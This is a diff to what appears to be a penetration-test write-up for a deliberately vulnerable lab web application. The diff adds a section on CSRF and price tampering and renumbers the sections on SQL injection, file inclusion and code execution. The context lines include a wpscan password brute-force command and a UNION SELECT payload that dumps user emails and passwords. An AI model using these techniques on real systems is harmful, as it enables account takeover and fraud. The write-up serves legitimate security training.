@@ -85,7 +85,25 @@ Enumerated user `mkowalski` via wp-json, gathered personal data from blog profil
 wpscan --url 10.10.10.10/blog -U mkowalski -P marek.txt
 ```
 
-### 3. SQL Injection — Database Extraction
+### 3. Parameter Tampering & CSRF
+
+**Location:** `/Deals.php` purchase functionality
+
+**Proof of Concept:** Host [`deal4.html`](./scripts/deal4.html) locally and visit while logged into the target application. The auto-submit form changes the price parameter from `$100` to `$4,800,000`.
+
+**Demonstration:**
+```bash
+# Start local web server
+python3 -m http.server 8080
+
+# Visit from victim browser
+# http://10.10.10.128:8080/deal4.html
+```
+The transaction processes under the victim's authenticated session, demonstrating missing CSRF protection and lack of server-side price validation.
+
+<p align="center"><img src="figures/07-CSRF.png" width="600"/></p>
+
+### 4. SQL Injection — Database Extraction
 
 **Location:** `/visiter-newsdesk.php?id=`
 
@@ -106,7 +124,7 @@ UNION SELECT 1,Email,3,Password,Admin,6 FROM Users
 
 **Result:** All 12 employee accounts extracted including admin credentials (`eliasv@cyberstepsvuln.com`).
 
-### 4. Local File Inclusion — ThemeLoader Exploit
+### 5. Local File Inclusion — ThemeLoader Exploit
 
 **Location:** `/ThemeLoader.php?theme=` parameter
 
@@ -120,7 +138,7 @@ Decoded `wp-config.php` revealed database credentials, enabling further exploita
 
 <p align="center"\>\<img src="figures/04-lfi-traversal.png" width="600"/></p>
 
-### 5. Remote Code Execution — The Final Chain
+### 6. Remote Code Execution — The Final Chain
 
 **Attack Vector: File upload bypass + Admin panel LFI**
 
